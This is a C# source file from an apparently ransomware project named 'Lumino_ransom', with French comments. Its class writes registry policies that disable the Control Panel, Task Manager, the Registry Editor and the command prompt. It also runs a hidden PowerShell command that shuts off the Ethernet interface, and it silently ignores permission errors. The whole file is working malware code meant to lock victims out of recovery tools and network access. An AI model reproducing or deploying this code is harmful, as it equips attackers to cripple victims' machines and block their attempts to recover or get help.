

/*                                  ***|---------------------------------------------------------------------------------------------------------------|\*/
using Microsoft.Win32;              /*\|                    Librairie pour créer des processus (System.Diagnostics) et                                 |\*/
using System.Diagnostics;           /*\|                       pour modifier la base de registre (Microsoft.Win32)                                     |\*/
/*                                  ***|---------------------------------------------------------------------------------------------------------------|\*/



// namespace Lumino_ransom
namespace Lumino_ransom
{

    // public class Disable_All
    internal class Disable_All
    {

        public void Disable_Parameter() // Fonction pour désactiver les paramètres de sécurité
        {
            try
            {

                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(             //| --> Création de la clé de registre pour désactiver les paramètres
                       @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");     //|
                objRegistryKey.GetValue("NoControlPanel");                                  // Ouvre la clé de registre pour la modifier (NoControlPanel)
                objRegistryKey.SetValue("NoControlPanel", "1", RegistryValueKind.DWord);    // Désactive le panneau de configuration en modifiant la valeur de la clé de registre "NoControlPanel" à 1
                objRegistryKey.Close();                                                     // Ferme la clé de registre
            }
            catch (System.AccessViolationException) { }    // Si il y a une violation de l'accès, on ne fait rien
            catch (System.UnauthorizedAccessException) { } // Si on n'a pas l'autorisation, on ne fait rien
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Internet_Dis() // Fonction pour désactiver la connexion internet
        {
            try
            {
                Process mtd = new Process();                                                                         // Création d'un nouveau processus
                mtd.StartInfo.FileName = "powershell.exe";                                                           // On lui donne le nom du programme à exécuter ("powershell.exe"/ Powershell Windows)
                mtd.StartInfo.Arguments = "/C netsh interface set interface name=\"Ethernet\" admin=Disabled";       // On lui donne les arguments à exécuter (Désactiver l'interface Ethernet) en code PowerShell
                mtd.StartInfo.UseShellExecute = true;                                                                // On lui dit d'utiliser le shell
                mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                                               // On lui dit de ne pas afficher la fenêtre
                mtd.Start();                                                                                         // On lance le processus
                mtd.Close();                                                                                         // On ferme le processus
            }
            catch (System.AccessViolationException) { }    // Si il y a une violation de l'accès, on ne fait rien
            catch (System.UnauthorizedAccessException) { } // Si on n'a pas l'autorisation, on ne fait rien
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Disble_Taskmgr() // Fonction pour désactiver le gestionnaire de tâches
        {
            try
            {

                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(          //| --> Création de la clé de registre pour désactiver le gestionnaire de tâches
                       @"Software\Microsoft\Windows\CurrentVersion\Policies\System");    //|
                objRegistryKey.GetValue("DisableTaskMgr");                               // Ouvre la clé de registre pour la modifier (DisableTaskMgr)
                objRegistryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord); // Désactive le gestionnaire de tâches en modifiant la valeur de la clé de registre "DisableTaskMgr" à 1
                objRegistryKey.Close();                                                  // Ferme la clé de registre
            }
            catch (System.AccessViolationException) { }    // Si il y a une violation de l'accès, on ne fait rien
            catch (System.UnauthorizedAccessException) { } // Si on n'a pas l'autorisation, on ne fait rien

        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Disble_Registry() // Fonction pour désactiver l'éditeur de registre
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(                 //| --> Création de la clé de registre pour désactiver l'éditeur de registre
       @"Software\Microsoft\Windows\CurrentVersion\Policies\System");                           //|
                objRegistryKey.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);  // Désactive l'éditeur de registre en modifiant la valeur de la clé de registre "DisableRegistryTools" à 1

                objRegistryKey.Close();                                                         // Ferme la clé de registre
            }
            catch (System.AccessViolationException) { }     // Si il y a une violation de l'accès, on ne fait rien
            catch (System.UnauthorizedAccessException) { }  // Si on n'a pas l'autorisation, on ne fait rien

        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
        public void Disble_CMD() // Fonction pour désactiver la console/terminal (CMD)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(         //| --> Création de la clé de registre pour désactiver la console/terminal (CMD)
        @"Software\Policies\Microsoft\Windows\System");                                 //|
                objRegistryKey.SetValue("DisableCMD", "1", RegistryValueKind.DWord);    // Désactive la console/terminal (CMD) en modifiant la valeur de la clé de registre "DisableCMD" à 1

                objRegistryKey.Close();                                                 // Ferme la clé de registre
            }
            catch (System.AccessViolationException) { }    // Si il y a une violation de l'accès, on ne fait rien
            catch (System.UnauthorizedAccessException) { } // Si on n'a pas l'autorisation, on ne fait rien

        }

    }
}
